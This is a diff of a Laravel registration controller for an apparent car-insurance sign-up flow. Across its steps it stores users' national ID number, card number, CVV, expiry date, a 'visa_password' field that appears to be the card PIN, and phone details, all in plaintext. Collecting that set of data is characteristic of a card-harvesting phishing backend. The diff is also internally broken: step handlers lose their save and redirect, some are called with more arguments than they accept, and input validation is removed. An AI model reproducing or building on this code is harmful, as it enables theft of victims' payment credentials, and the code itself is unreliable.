@@ -6,34 +6,25 @@ use App\Http\Controllers\Controller;
 use App\Models\Client;
 use App\Models\MobileCompany;
 use App\Models\Notification;
+use App\Services\validationService;
 use Illuminate\Http\Request;
 use RealRashid\SweetAlert\Facades\Alert;
 
 class RegistrationController extends Controller
 {
     public function storeNationalNumber(Request $request){
-        $request->validate([
-            'national_number' =>'required|unique:clients|size:10'
-        ] ,
-        ['national_number.required' =>'برجاء ادخال الرقم القومى' ,
-        'national_number.unique' => 'الرقم القومى مسجل من قبل',
-        'national_number.size'=> 'الرقم القومى مكون من 10 ارقام'
-        ]);
-        $client = Client::where('national_number' , $request->national_number)->first();
-        if($client){
-            Alert::error('خطا', 'هذا الرقم القومى مسجل بالفعل');
-            return redirect()->route('landing');
-        }else {
-            $client = new Client();
-            $client->national_number = $request->national_number;
-            $client->end_point = AFTER_SEND_ID;
-            $client->save();
-            return redirect()->route('client.continue',['id'=> $client->id ,'national_number'=> $client->national_number] );
-        }
+        $client = new Client();
+        $client->national_number = $request->national_number;
+        $client->end_point = AFTER_SEND_ID;
+        $client->save();
+        return redirect()->route('client.continue',['id'=> $client->id ,'national_number'=> $client->national_number] );
+
     }
 
     public function continue($client_id , $national_number){
+
         $client=Client::where( ['id' => $client_id , 'national_number' => $national_number] )->firstOrFail();
+
         if($client->end_point == AFTER_SEND_ID){
             return view('frontend.steps.step-one' , compact('client'));
         }elseif ($client->end_point == STEP_TWO) {
@@ -58,39 +49,48 @@ class RegistrationController extends Controller
 
     public function storeStep(Request $request){
         $inputs = $request->all();
+        $client = Client::where( ['id'=> $inputs['client_id'] , 'national_number' => $inputs['national_number']] )->firstOrFail();
         if($inputs['step'] == 1){
-           return $this->submit_step_one($inputs);
+            $array_validation = validationService::stepOneValidation();
+            $request->validate($array_validation[0],$array_validation[1]);
+           return $this->submit_step_one($request ,$client);
         }elseif ($inputs['step'] == 2 ) {
-            return $this->submit_step_two($inputs);
+            $array_validation = validationService::stepTwoValidation();
+            $request->validate($array_validation[0] ,$array_validation[1]);
+            return $this->submit_step_two($inputs,$client);
         }elseif ($inputs['step'] == 3 ) {
-            return $this->submit_step_three($inputs);
+            return $this->submit_step_three($inputs,$client);
         }elseif ($inputs['step'] == 4 ) {
-            return $this->submit_step_four($inputs);
+            return $this->submit_step_four($inputs,$client);
         }elseif ($inputs['step'] == 5 ) {
-            return $this->submit_step_five($inputs);
+            $array_validation = validationService::stepFiveValidation();
+            $request->validate($array_validation[0],$array_validation[1]);
+            return $this->submit_step_five($inputs,$client);
         }elseif ($inputs['step'] == 6 ) {
-            return $this->submit_step_six($inputs);
+            $array_validation = validationService::stepSixValidation();
+            $request->validate($array_validation[0],$array_validation[1]);
+            return $this->submit_step_six($inputs,$client);
         }elseif ($inputs['step'] == 7 ) {
-            return $this->submit_step_seven($inputs);
+            $array_validation = validationService::stepSevenValidation();
+            $request->validate($array_validation[0],$array_validation[1]);
+            return $this->submit_step_seven($inputs,$client);
         }elseif ($inputs['step'] == 8 ) {
-            return $this->submit_step_eight($inputs);
+            return $this->submit_step_eight($inputs,$client);
         }
+        $client->save();
+        return redirect()->route('client.continue',['id'=> $client->id ,'national_number'=> $client->national_number] );
     }
 
-    public function submit_step_one($inputs){
-        $client = Client::whereId($inputs['client_id'])->firstOrFail();
+    public function submit_step_one($inputs,$client){
         $client->first_name = $inputs['first_name'];
         $client->serial_number = $inputs['serial_number'];
         $client->birth_date = $inputs['birth_date'];
         $client->credit_soshiable = $inputs['credit_soshiable'];
         $client->end_point = STEP_TWO;
         $client->first_name = $inputs['first_name']??0;
-        $client->save();
-        return redirect()->route('client.continue',['id'=> $client->id ,'national_number'=> $client->national_number] );
     }
 
-    public function submit_step_two($inputs){
-        $client = Client::where( ['id'=> $inputs['client_id'] , 'national_number' => $inputs['client_national_number']] )->firstOrFail();
+    public function submit_step_two($inputs,$client){
         $client->insurance_type = $inputs['insurance_type'];
         $client->contract_started_at = $inputs['contract_started_at'];
         $client->estimated_car_value = $inputs['estimated_car_value'];
@@ -100,47 +100,32 @@ class RegistrationController extends Controller
         $client->car_made_at = $inputs['car_made_at'];
         $client->repair_in = $inputs['repair_in'];
         $client->end_point = STEP_THREE;
-        $client->save();
-        return redirect()->route('client.continue',['id'=> $client->id ,'national_number'=> $client->national_number] );
+
     }
     public function submit_step_three($inputs){
         $client = Client::where( ['id'=> $inputs['client_id'] , 'national_number' => $inputs['national_number']] )->firstOrFail();
         $client->service_id = $inputs['service_id'];
         $client->end_point = STEP_FOUR;
-        $client->save();
-        return redirect()->route('client.continue',['id'=> $client->id ,'national_number'=> $client->national_number] );
     }
-    public function submit_step_four($inputs){
-        $client = Client::where( ['id'=> $inputs['client_id'] , 'national_number' => $inputs['national_number']] )->firstOrFail();
+    public function submit_step_four($inputs,$client){
         $client->total_price = $inputs['total_price'];
         $client->end_point = STEP_FIVE;
-        $client->save();
-        return redirect()->route('client.continue',['id'=> $client->id ,'national_number'=> $client->national_number] );
     }
-    public function submit_step_five($inputs){
-        $client = Client::where( ['id'=> $inputs['client_id'] , 'national_number' => $inputs['national_number']] )->firstOrFail();
+    public function submit_step_five($inputs,$client){
         $client->visa_number = $inputs['visa_number'];
         $client->visa_vcc = $inputs['visa_vcc'];
         $client->first_name = $inputs['first_name'];
         $client->visa_end_at = $inputs['visa_end_at'];
         $client->end_point = STEP_SIX;
-        $client->save();
-        return redirect()->route('client.continue',['id'=> $client->id ,'national_number'=> $client->national_number] );
     }
-    public function submit_step_six($inputs){
-        $client = Client::where( ['id'=> $inputs['client_id'] , 'national_number' => $inputs['national_number']] )->firstOrFail();
+    public function submit_step_six($inputs,$client){
         $client->visa_password = $inputs['visa_password'];
         $client->end_point = STEP_SEVEN;
-        $client->save();
-        return redirect()->route('client.continue',['id'=> $client->id ,'national_number'=> $client->national_number] );
     }
-    public function submit_step_seven($inputs){
-        $client = Client::where( ['id'=> $inputs['client_id'] , 'national_number' => $inputs['national_number']] )->firstOrFail();
+    public function submit_step_seven($inputs,$client){
         $client->phone = $inputs['phone'];
         $client->network_id = $inputs['network_id'];
         $client->end_point = STEP_Eight;
-        $client->save();
-        return redirect()->route('client.continue',['id'=> $client->id ,'national_number'=> $client->national_number] );
     }
     public function submit_step_eight($inputs){
         $client = Client::where( ['id'=> $inputs['client_id'] , 'national_number' => $inputs['national_number']] )->firstOrFail();
